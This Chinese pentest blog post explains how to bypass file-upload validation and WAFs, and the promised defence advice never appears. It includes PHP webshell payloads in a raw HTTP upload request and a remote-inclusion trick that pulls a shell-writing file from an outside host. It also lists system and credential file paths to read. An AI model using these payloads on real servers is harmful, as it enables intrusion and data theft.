---
layout: post
title: 文件上传漏洞绕过姿势
date: 2018-06-08
categories: blog
tags: [文件上传,绕过,渗透]
description: 。
---

文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。

# 文件上传校验姿势
- 客户端javascript校验（一般只校验后缀名）
- 服务端校验
    - 文件头content-type字段校验（image/gif）
    - 文件内容头校验（GIF89a）
    - 后缀名黑名单校验
    - 后缀名白名单校验
    - 自定义正则表达式
- WAF设备校验

# 文件校验方式
1. 客户端校验
  一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。
　判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。

2. 服务端校验
   
2.1  content-type字段校验
   这里以PHP代码为例，模拟web服务器端的校验代码
```
<?php
if($_FILES[‘userfile‘][‘type‘] != "image/gif") #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。
{
echo "Sorry, we only allow uploading GIF images";
exit;
}
$uploaddir = ‘uploads/‘;
$uploadfile = $uploaddir . basename($_FILES[‘userfile‘][‘name‘]);
if (move_uploaded_file($_FILES[‘userfile‘][‘tmp_name‘], $uploadfile))
{
echo "File is valid, and was successfully uploaded.\n";
} else {
echo "File uploading failed.\n";
}
?>
```

可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。


2.2 文件头校验
可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：

- `.JPEG;.JPE;.JPG，”JPGGraphic File” `
- ` .gif，”GIF 89A”`
- ` .zip，”Zip Compressed”`
- `.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”`


# 文件上传绕过方式

1. 客户端绕过
    可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。
2. 服务端绕过
# 内容绕过
  - 我们可以通过抓包，将content-type字段改为image/gif
```
POST /upload.php HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: TE, close
Host: localhost
User-Agent: libwww-perl/5.803
Content-Type: multipart/form-data; boundary=xYzZY
Content-Length: 155
--xYzZY
Content-Disposition: form-data; name="userfile"; filename="shell.php"
Content-Type: image/gif (原为 Content-Type: text/plain)
<?php system($_GET[‘command‘]);?>
--xYzZY-
```
- 文件头绕过
    在木马内容基础上再加了一些文件信息，有点像下面的结构
    `GIF89a<?php phpinfo(); ?>`

# 黑名单绕过  
- 文件后缀名绕过
    前提：**黑名单校验**
黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。
绕过方法：
（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类
（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类
能被解析的文件扩展名列表：
```
jsp jspx jspf
asp asa cer aspx
php php php3 php4
exe exee
```

  (3)上传htaccess文件
  上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。
  ![photo](http://www.mottoin.com/wp-content/uploads/2016/08/17-3.png)
  在可以上传.htaccess文件时，先上传.htaccess文件，覆盖掉原先的.htaccess文件；再上传【evil.gif】文件。使用图中的.htaccess语句，即可将【evil.gif】文件以php脚本方式解析。
  (4)点&空格绕过(windows)
  比如发送的http包里把文件名改成test.asp. 或者test.asp_（下划线为空格），这种命名方式。在window  系统里是不允许的，所以需要在burp之类的抓包工具里修改，然后绕过验证后，会被window系统自动去掉后面的点和空格，这个只能在window系统中
  (5)::$DATA绕过
  `test.php::$DATA`
  `shell.php::$DATA…….`
  会被windows系统自动去掉不符合规则符号后面的内容。
  
# 配合文件包含漏洞
1. 校验执行文件内容是否为木马
前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。
绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）
（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；
（2）然后再上传一个.php的文件，内容为<?php Include(“上传的txt文件路径”);?>
此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：

```

#PHP
<?php Include("上传的txt文件路径");?>
#ASP
<!--#include file="上传的txt文件路径" -->
#JSP
<jsp:inclde page="上传的txt文件路径"/>
or
<%@include file="上传的txt文件路径"%>

```
2. 远程包含漏洞

前提：需要开启`allow_url_fopen`，默认关闭。
新建php.txt:
```php
<?php
   echo "hello world";
?>
```
新建index.php:
```php
<?php
    Include($_GET['page']);
?>
```
访问`http://www.xxxx.com/page=http://www.xxxx.com/php.txt`执行结果将输出hello world。

3. 文件包含利用
如：`http://www.xxx.com/index.php?page=/etc/passwd`

Windows:
```
c:\boot.ini
c:\windows\systems32\inetsrv\MetaBase.xml
c:\windows\repair\sam
c:\windows\php.ini             php配置文件
c:\windows\my.ini      
```

LINUX:
```
/etc/passwd
/usr/local/app/apache2/conf/http.conf
/usr/local/app/php5/lib/php.ini          PHP相关设置
/etc/httpd/conf/http.conf   apache配置文件
/etc/my.cnf  mysql配置文件

```

4. 远程包含shell
test.txt文件，可以保存在远程服务器上，内容如下：
```php
<?fputs(fopen("shell.php","w"),"<?php eval($_POST[nmask]);?>")?>

```
如果目标网站存在远程包含漏洞，则可以通过访问：`http://www.xxx1.com/index.php?page=http://www.xx2.com/test.txt`则会在服务器根目录下生产一个shell.php内容为:
`<?php   eval($_POST[nmask]);?>`

5. 本地包含配合文件上传
如果目标服务器关闭了`allow_url_fopen`，则可以尝试使用本地包含+文件上传
上传一个图片木马a.jpg，内容为：
`<?fputs(fopen("shell.php","w"),"<?php eval($_POST[tzc]);?>")?>`
访问URL：`http://www.xxx.com/index.php?page=./a.jpg`在本地生成shell.php。



# 白名单绕过
- 0x00截断
基于一个组合逻辑漏洞，通常存在于构造上传文件路径的时候
```
test.php(0x00).jpg
test.php%00.jpg

```
代码演示：

```

name= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)
type =gettype(name) //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg
if(type == jpg)
SaveFileToPath(UploadPath.name, name) //但在这里却是以 0x00 作为文件名截断
//最后以 help.asp 存入路径里

```

# WAF绕过
1. 垃圾数据
有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；

![photo](https://thief.one/upload_image/20160922/1.png)

也可以放到数据包开头
![photo](https://thief.one/upload_image/20160922/2.png)

2. filename
    针对早期版本安全狗，可以多加一个filename
![photo](http://thief.one/upload_image/20160922/3.png)
或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：
![photo](http://thief.one/upload_image/20160922/13.png)

3. GET/POST

有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。
此种情况可以上传一个POST型的数据包，抓包将POST改为GET。

4. 利用WAF的本身缺陷

- 删除实体里面的Conten-Type字段
![photo](http://thief.one/upload_image/20160922/4.png)

- 修改Content-Disposition字段值的大小写
![photo](http://thief.one/upload_image/20160922/6.png)

- 文件名处回车
![photo](http://thief.one/upload_image/20160922/8.png)

- 多个Content-Disposition
在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP
![photo](http://thief.one/upload_image/20160922/9.png)

- 文件重命名绕过
如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。
![photo](http://thief.one/upload_image/20160922/11.png)

- 特殊的长文件名绕过
文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：
shell.asp;城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城城.jpg




# 上传文件技巧

1. 上传非法文件
返回结果快-->2
返回结果慢-->3
2. 客户端校验
3. 服务端校验(是否能上传非图片内容，图片后缀的文件)
    是-->4
    否-->5
4. 检查后缀(是否可以上传任意后缀)
   是-->黑名单
   否-->白名单
5. 检查内容(上传成功的图片与上传前比较，大小、颜色、MD5是否有变化)
   是-->重新渲染
   否-->只读取内容
